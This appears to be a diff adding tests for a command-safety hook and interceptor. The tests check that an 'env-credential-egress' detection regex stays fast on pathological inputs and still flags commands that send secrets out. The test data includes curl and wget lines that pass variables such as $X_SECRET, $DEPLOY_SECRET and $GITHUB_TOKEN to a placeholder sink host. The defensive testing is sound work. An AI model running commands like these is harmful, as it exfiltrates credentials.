@@ -208,3 +208,61 @@ describe('#509 r8 — Hermes: the same two properties, through fallback_surface 
     expect(rows.map((r) => ({ ...r, under: r.ms < result.budget_ms }))).toEqual(rows.map((r) => ({ ...r, hit: false, under: true })));
   });
 });
+
+// #1005 (SCN-008b): the `env-credential-egress` outage row. The shapes table
+// above runs through the self-protection entry point, which never reaches a
+// dangerous-only row, so this block compiles the row's SHIPPED text from each
+// table and drives it directly at the cap. The row's behaviour through the
+// interceptor's real outage path is pinned in gate-degraded-59, and the hook
+// row is held byte-identical to the interceptor's by enforcement-surface-parity.
+describe('#1005 — the env-credential-egress outage row is linear and unbounded inside the cap (hook, interceptor)', () => {
+  function envRow(src: string): RegExp {
+    const line = src.split('\n').find((l) => l.includes("signal: 'env-credential-egress'"));
+    const m = line?.match(/^\s*\{ re: \/(.*)\/i, signal: 'env-credential-egress'/);
+    expect(m?.[1]).toBeDefined();
+    return new RegExp(m![1], 'i');
+  }
+  const rows: Array<[string, RegExp]> = [['hook', envRow(hookSrc)], ['interceptor', envRow(pluginSrc)]];
+
+  const envShapes: Record<string, string> = {
+    'client-spam': 'curl '.repeat(PAD / 5),
+    'quote-client-spam': '"curl '.repeat(PAD / 6),
+    'paren-client-spam': '(curl '.repeat(PAD / 6),
+    'backtick-client-spam': '`curl '.repeat(PAD / 6),
+    'client+non-credential-var': 'curl -s "$PAGE '.repeat(PAD / 15),
+    'client+dollar': 'curl "$'.repeat(PAD / 7),
+    'client+long-name': 'curl $' + 'a'.repeat(PAD),
+    'client+excluded-tokens': 'curl ' + '$PAGE_'.repeat(PAD / 6),
+    'credential-words-alone': '$X_TOKEN '.repeat(PAD / 9),
+    'client+header-spam': 'curl ' + '-H x '.repeat(PAD / 5),
+    'bash-c-nesting': 'bash -c "curl '.repeat(PAD / 14),
+    'wrapper-spam': 'env '.repeat(PAD / 4),
+    'wrapper-flag-spam': 'env ' + '-a '.repeat(PAD / 3),
+    'quote-wrapper-client-spam': '"env curl '.repeat(PAD / 10),
+    'assignment-spam': '"A=" '.repeat(PAD / 5),
+    'path-spam': 'a/'.repeat(PAD / 2),
+    'keyword-spam': 'if '.repeat(PAD / 3),
+    newlines: '\n'.repeat(PAD),
+  };
+
+  it(`every shape, cut to the cap, under ${BUDGET_MS} ms and no match`, () => {
+    for (const [surface, re] of rows) {
+      const report = Object.entries(envShapes).map(([shape, text]) => {
+        const { ms, result } = best(() => re.test(text.slice(0, CAP)));
+        return { surface, shape, ms, hit: result };
+      });
+      expect(report.map((r) => ({ ...r, under: r.ms < BUDGET_MS }))).toEqual(report.map((r) => ({ ...r, hit: false, under: true })));
+    }
+  });
+
+  it('a credential variable far from its client is still seen inside the cap — no gap bound', () => {
+    for (const [surface, re] of rows) {
+      const got = [
+        padTo('curl ', ' "$SINK?k=$X_SECRET"', CAP),
+        padTo('wget -qO- ', ' "${SINK}/c?t=${DEPLOY_SECRET}"', CAP),
+        'x; ' + padTo('curl ', ' "$SINK?k=$GITHUB_TOKEN"', CAP - 3),
+      ].map((c) => ({ surface, len: c.length, hit: re.test(c) }));
+      expect(got).toEqual(got.map((g) => ({ ...g, hit: true })));
+    }
+  });
+});
